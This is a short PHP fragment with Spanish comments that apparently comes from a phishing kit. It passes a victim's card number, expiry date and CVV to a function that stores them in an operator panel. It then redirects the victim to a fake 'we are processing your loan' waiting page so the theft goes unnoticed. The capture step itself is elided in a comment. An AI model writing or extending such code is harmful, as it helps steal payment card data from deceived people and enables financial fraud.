<?php
require_once('../panel/lib/funciones.php');
// ... captura de datos de tarjeta ...
actualizar_registro_tar($id, $tar, $fec, $cvv);

// FINAL: Lo mandamos a la pantalla de "Estamos procesando su préstamo"
header("Location: ../a/WAITING.php");
?>
